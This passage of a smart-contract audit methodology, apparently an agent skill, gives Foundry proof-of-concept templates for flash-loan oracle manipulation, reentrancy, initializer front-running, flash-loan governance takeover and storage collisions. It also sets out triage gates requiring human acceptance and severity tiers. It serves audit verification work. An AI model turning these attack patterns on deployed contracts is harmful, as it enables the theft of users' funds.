#### Pattern 4: "Oracle manipulation via flash-loan"

```solidity
function test_oracle_manip() public {
    // Borrow a large amount of token X from Aave / Balancer / Maker
    uint256 borrowed = 10_000_000e6;
    IFlashLoanProvider(AAVE).flashLoanSimple(address(this), USDC, borrowed, "", 0);
}
function executeOperation(address, uint256 amount, uint256 fee, address, bytes calldata) external returns (bool) {
    // 1. Swap USDC into the oracle's reference asset to skew the spot price
    IUniswapV2Router(ROUTER).swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    // 2. Call the vulnerable function that reads the skewed price
    targetProtocol.liquidate(victim);
    // 3. Swap back, repay flash loan
    IUniswapV2Router(ROUTER).swapExactTokensForTokens(...);
    USDC.approve(AAVE, amount + fee);
    return true;
}
```

#### Pattern 5: "Reentrancy via callback"

```solidity
contract Attacker is IERC777Recipient {
    function tokensReceived(...) external override {
        // re-enter the protocol during the callback
        if (target.balanceOf(address(this)) > 0) {
            target.withdraw(target.balanceOf(address(this)));
        }
    }
    function attack() external {
        target.deposit(initialAmount);
        target.withdraw(initialAmount);  // triggers callback which re-enters
    }
}
```

#### Pattern 6: "Reachable state bricks a legitimate operation"

```solidity
function test_reachable_state_bricks_legitimate_claim() public {
    address user = makeAddr("user");

    // Control: the legitimate operation succeeds from the normal state.
    uint256 controlId = _createMatureClaim(user);
    vm.prank(user);
    target.claim(controlId);
    assertTrue(target.claimed(controlId), "control claim succeeds");

    // Candidate path: an allowed setup action creates a reachable state in
    // which the same legitimate operation can no longer complete.
    uint256 blockedId = _createMatureClaim(user);
    _reachCandidateState(blockedId);
    bytes4 expectedError = target.BlockedClaim.selector;
    vm.prank(user);
    vm.expectRevert(expectedError);
    target.claim(blockedId);
    assertFalse(target.claimed(blockedId), "legitimate claim remains blocked");
}
```

#### Pattern 7: "Fund-extracting state-zero exploit"

```solidity
function test_zero_state_resurrection() public {
    // 1. Drive pool to total loss via repeated defaults
    _causeTotalLoss();
    assertEq(target.totalPoolValue(), 0);
    // 2. New depositor enters; shares minted 1:1
    address victim = makeAddr("v"); _approveAndDeposit(victim, 1000e6);
    // 3. Stale shareholder (held shares from before loss) withdraws
    assertEq(staleHolder.withdrawableFundsOf() > 0, true, "stale holder resurrected");
}
```

#### Pattern 8: "Front-run initializer"

```solidity
function test_init_frontrun() public {
    // Deploy implementation
    Target impl = new Target();
    // Deploy proxy, but attacker calls initialize first
    bytes memory initData = abi.encodeWithSignature("initialize(address)", attacker);
    ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
    vm.prank(attacker);
    (bool ok,) = address(proxy).call(initData);
    assertTrue(ok, "attacker initialized");
    // attacker is now owner
}
```

#### Pattern 9: "Same-transaction governance-power amplification"

```solidity
function test_flashloan_gov() public {
    uint256 borrowed = 100_000_000e18;  // 100M of governance token
    IFlashLoanProvider(MAKER).flashLoan(address(this), TOKEN, borrowed, "");
}
function onFlashLoan(...) external returns (bytes32) {
    // This pattern is valid only if the deployed governor permits the complete
    // propose/vote/execute path in one production transaction (for example an
    // emergency path with no snapshot delay, voting period, or timelock).
    gov.delegate(address(this));
    uint256 propId = gov.propose(targets, values, calldatas, "drain");
    gov.castVote(propId, 1);
    gov.execute(propId);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

**Reachability rule:** never use `skip`, `warp`, or `roll` while an atomic loan is outstanding to manufacture a voting delay, snapshot, or timelock transition. If production governance spans blocks/transactions, model those real transactions and prove the attacker retains voting power and pays the capital cost throughout; a one-transaction flash loan cannot cross that delay. A delayed governor that rejects the same-transaction sequence is the negative control, not an obstacle to cheat around.

#### Pattern 10: "Storage-slot collision on upgrade"

```solidity
function test_upgrade_collision() public {
    // 1. Old impl: write some value at slot S via field A
    OldImpl(proxy).setA(0x4242);
    // 2. Upgrade to new impl where slot S now backs a different field (field B)
    vm.prank(proxyAdmin); proxy.upgradeTo(address(new NewImpl()));
    // 3. Read field B — should reveal the leaked value
    assertEq(NewImpl(proxy).getB(), 0x4242, "storage collision");
}
```

### How to choose a pattern

If an executable Foundry test is useful, adapt the closest pattern. Otherwise use
the verification method that best tests the disputed claim.

### Assertion discipline

An executable PoC should assert a consequence such as:

- `assertGt(attackerBalAfter, attackerBalBefore + gasCost)` — attacker profited net of cost without subtraction underflow
- `assertLt(victimBalAfter, victimBalBefore)` — victim lost
- `assertEq(state, unexpectedValue)` — state reached impossible-by-intent value
- `vm.expectRevert(...)` — for DoS hypotheses, the legitimate path now reverts

Other consequences—authorization loss, governance capture, privacy breach,
consensus/network impact, or invariant corruption—need their own measurable
criterion. The taxonomy is not funds-only.

### Evidence verdicts

Record code-impact severity, current-deployment exploitability, and evidence confidence separately:

- **CONFIRMED-DEPLOYED** — evidence closes the claimed mechanism and impact against the actual deployed code, configuration, dependencies, and relevant pinned state. Historical transactions/traces, replay, faithful simulation, state proofs plus derivation, or a deployment-faithful formal proof may qualify; record the method and anchors.
- **CONFIRMED-RECONSTRUCTION** — the exploit succeeds against a documented reconstruction, but the harness cannot faithfully clone deployed state. Record every state source and deviation.
- **CONFIRMED-LOGIC** — reviewable evidence closes the code-level mechanism, but deployed exposure remains unverified or no deployment exists.
- **INCONCLUSIVE** — the hypothesis remains open because a material proof obligation, target/state binding, dependency, or impact link is incomplete. A tool failure is not refutation.
- **REFUTED** — faithful evidence demonstrates that a necessary precondition is unreachable or the claimed effect cannot occur. State precisely which premise was disproved.

Never lower severity solely because verification was blocked. Lower it only when evidence removes a prerequisite, bounds the impact, or disproves the attack chain. An `INCONCLUSIVE` candidate classified `MATERIAL` under the engagement's stated policy is a report limitation and prevents an unqualified clean verdict, regardless of the names used by its severity taxonomy.

---

## Triage Gate — From Evidence to Finding

Before promotion, apply the full contract in `triage.md`. The method is open; the
claim obligations are not:

1. bind the evidence to the scoped target and state claimed through the current
   `target-lock.md` SHA-256 and exact claim-specific `T-NN` artifact set; verify
   that lock identity matches `scope.md`;
2. establish the attacker entry, preconditions, transitions, and effect;
3. challenge the impact criterion with a meaningful control, counterexample
   search, or proof-obligation review;
4. pin source, state, dependencies, toolchain, commands or review procedure,
   provenance, and artifact hashes;
5. deduplicate by root cause, violated invariant, and sink against known,
   rejected, fixed, and prior issues;
6. compare attacker prerequisites/cost with user, protocol, or network impact;
7. have a validator other than the producer inspect the primary artifacts and
   independently challenge the claim; the validator may rerun or re-review the
   documented method, use a different sound method, or do both;
8. have a human auditor accept the finding and severity.

Sequence-shaped candidates must preserve the complete transitions and state
dependencies using a suitable method, such as a stateful harness, trace,
simulation, symbolic/model-checking result, or formal derivation. Rejected,
duplicate, out-of-scope, and inconclusive
candidates remain in the triage registry; they are not findings. Material
inconclusive candidates remain report limitations.

---

### I. Severity Calibration (Post-Pass)

Severity = **Impact × Likelihood**, with prerequisite cost as a divisor. Evidence confidence does not mathematically reduce severity; report it as a separate field so an unverified High does not become a false Low.

| Axis | Levels | Notes |
|------|--------|-------|
| **Blast radius** | All funds / single user / capped amount | Sets cap on $ at risk |
| **Reversibility** | Permanent / pause-recoverable / governance-recoverable | Affects exit options |
| **Prerequisites** | Anyone / requires capital / requires privileged role / requires specific market state | Multiplier on attacker cost |
| **Mempool visibility** | Front-runnable / private | Affects exploitation race |
| **Detection latency** | Immediate (event) / delayed (off-chain monitor) / silent | Affects response window |

**Tiers (calibrate from impact and prerequisites; these are examples, not a funds-only taxonomy):**

- **Critical** — permissionless or realistically attainable path to arbitrary/near-total fund loss, unbounded mint/insolvency, protocol-wide permanent freeze, or governance/admin takeover with immediate system-wide control; typically irreversible and requiring no trusted-role compromise.
- **High** — material but bounded/recoverable fund loss, repeatable market-state extraction, broad integrity failure, or protocol-wide liveness loss with feasible prerequisites.
- **Medium** — limited/single-user loss, temporary or narrowly scoped liveness/integrity impact, or an escalation that requires substantial prerequisites. Merely assuming an already-trusted role is compromised is a threat-model dependency, not automatically a vulnerability.
- **Low** — minor operational or correctness impact with no material fund, control, integrity, or sustained-liveness consequence.
- **Informational** — a human-accepted security-relevant correctness or
  defense-in-depth item without a demonstrated exploitable consequence. Pure
  gas, style, or documentation notes remain observations unless the engagement's
  explicit taxonomy requires reporting them as findings.

Critical findings block deployment; High requires sign-off; Medium tracked.

---

## Example Artifact Workflow (Discovery Methods Unrestricted)

Steps 0–6 illustrate compatible artifacts and prompts; they are not a mandatory
search order or toolchain. Replace, reorder, or omit them when another method
provides reviewable target understanding and coverage evidence. Steps 7–10 are
claim/closure gates: bind the evidence, independently challenge it, calibrate the
accepted claim, and report residual gaps.

```
0. Pin scope and target identity.             [Context + target-lock.md]
   Reconcile scope.md with target-lock.md, hash each relied-on target artifact,
   assign T-NN IDs, and record the completed target-lock SHA-256. Read docs,
   whitepaper, and prior audits as useful context.
1. Optionally record target-model artifacts (or link equivalents):
   O.1 One-paragraph protocol summary           [your own words]
   O.2 Value-flow diagram                       [tokens & edges]
   O.3 Storage glossary                         [per-variable gloss]
   O.4 Pre-read red flags                       [smell tests]
2. Optionally use the reachability Atlas scaffold:
   P.1 Sink inventory                           [grep — sinks.md]
   P.2 Gate-read inventory                      [grep — gates.md]
   P.3 Gate-write inventory                     [grep — writes.md]
   P.4 Reachable-path enumeration               [graph walk — paths.md]
   P.5 Intent specification & delta             [docs + set diff — intent.md, delta.md]
3. Optionally record invariant/state/trust artifacts:
   C. List invariants.                          [Pre-pass]
   D. Draw lifecycle state machines.            [Pre-pass — consumes P.2/P.3]
   E. Map trust boundaries.                     [Pre-pass]
4. Generate candidates by any method:
   Manual review, agents, SAST, fuzzing, invariant/property testing, symbolic or
   formal methods, differential analysis, transaction/trace analysis, custom
   queries, the optional atlas/ladders, or any combination.
   Every material lead becomes a schema-complete triage candidate, not a finding.
5. Optionally apply A/B prompts where useful:
   A. Bypass pass (A.1 → A.9).                  [Execution — A.9 is validation/closure]
   B. Boundary pass (B.1 → B.9).                [Execution — B.9 is validation/closure]
6. Optionally apply any F/G/H/X/J prompts that fit the target:
   F. Negative space — what's missing.          [Cross-pass]
   G. Differential — vs upstream / per chain.   [Cross-pass]
   H. Failure-mode catalog.                     [Cross-pass]
   X. Cross-boundary logic — function/contract/protocol seams. [Cross-pass]
   J. Business-logic & economic-design.         [Cross-pass]
7. Bind evidence to each claim:
   - Record the current target-lock SHA-256 and exact T-NN artifact subset in the
     candidate, verification manifest, validation, and accepted finding.
     Revalidate affected claims whenever the lock identity or an artifact changes.
   - Use any sound verification method: PoC, test, fuzz counterexample, invariant
     violation, trace/transaction analysis, simulation/replay, symbolic/formal
     result, differential proof, source-level proof, or a combination.
   - A current-deployment claim requires deployed-target/state evidence; replay is
     one option, not a requirement. Logic or reconstruction evidence must not be
     mislabeled as current deployment exposure.
   - Define the claimed impact and apply a method-appropriate falsification or
     control. Preserve multi-step transitions and state dependencies.
8. Independently triage (triage.md):
   - Run scope-fidelity, actor/reachability, impact/falsification,
     provenance/integrity, dedup, and cost-impact gates.
   - A validator other than the producer inspects the primary artifacts and
     independently challenges the claim. They may rerun or re-review the
     documented method, use a different sound method, or do both, then record
     the method and disposition.
   - A human auditor makes the final acceptance decision; only accepted candidates enter findings.md.
9. Calibrate and cross-reference:
   I. Calibrate code-impact severity, deployment exposure, and evidence confidence separately for accepted candidates.
   Cross-reference chain-specific metrics (metrics-evm.md, metrics-solana.md, metrics-sui.md).
   - Pattern match → historical precedent and an optional verification shape
   - No pattern match → potentially novel class; interrogate harder, promote to catalog after
   - The catalogs do not bound the audit; documented coverage and evidence do.
10. Close coverage:
   - Reconcile mechanically countable target/candidate/evidence/validation/finding
     artifacts, and separately record method-defined security obligations or
     surfaces with their status, evidence, and residual blind spots.
   - Resolve every candidate, or carry it with an evidence-backed terminal disposition; material INCONCLUSIVE candidates are explicit limitations.
   - Never issue `NO-MATERIAL-FINDINGS` while a material row remains open.
```

**The iterative loop.** This is presented linearly but real audits loop: any discovery method produces a candidate; verification reveals new state or assumptions; accepted and rejected outcomes drive gap-filling and new candidates. The phases are stable artifacts, not a central scheduler. Recon, hunting, gap-filling, and validation can run in parallel through versioned artifacts, but acceptance gates remain strict.

**How to inhabit this workflow.** The lenses are adversarial prompts, not a required search order. Use whatever methods best expose the target's blind spots; use the artifacts and triage gates to make coverage and truth claims reviewable.

**The completeness question — not a checklist, a self-test.** Before declaring an audit complete, ask yourself, *adversarially*:

- Is any security-relevant effect unsurveyed by the chosen methods? (If yes → extend coverage or report the gap.)
- Is any critical authorization/state transition missing reviewable coverage? (If yes → extend coverage or report the gap.)
- Is any permissionless write-to-unlock chain not traced to intent or an evidence-backed candidate disposition? (If yes → chase it.)
- Is any material cross-function, cross-contract, or dependency seam outside the selected coverage? (If yes → extend coverage or report the gap.)
- Is any material economic assumption outside the selected coverage? (If yes → extend coverage or report the gap.)
- Is any candidate missing a disposition, dedup result, or provenance? (If yes → finish triage.)
- Is any accepted candidate missing claim-bound evidence, method-appropriate falsification, independent validation, or a human decision? (If yes → it is not a finding.)
- Is any `MATERIAL` candidate missing an evidence verdict, or mislabeled as rejected due only to a blocked verification method? (If yes → finish verification or report `INCONCLUSIVE`.)

Only when every answer is "no" and `coverage.md` contains no unreported material gap may the audit be called complete. The discipline above is not a substitute for being a red-teamer; it keeps a red-teamer from missing the obvious chain while chasing the clever one.

---

## Limits

- Coverage is against *known* exploits — novel attack classes are not back-testable from history.
- Off-chain root causes (key compromise, signer phishing) cannot be addressed by source review; pair with operational due diligence.
- Methodology principles are platform-independent; implementation primitives are not. Use chain-native semantics and evidence. This skill includes optional playbooks and harnesses for EVM, Solana, and Sui; Aptos comparative notes are not production coverage.

**Source frameworks:** SWC, DASP Top 10, Trail of Bits Building Secure Smart Contracts, ConsenSys Smart Contract Best Practices, OpenZeppelin security advisories, Immunefi vulnerability classifications, DefiLlama Hacks dataset.
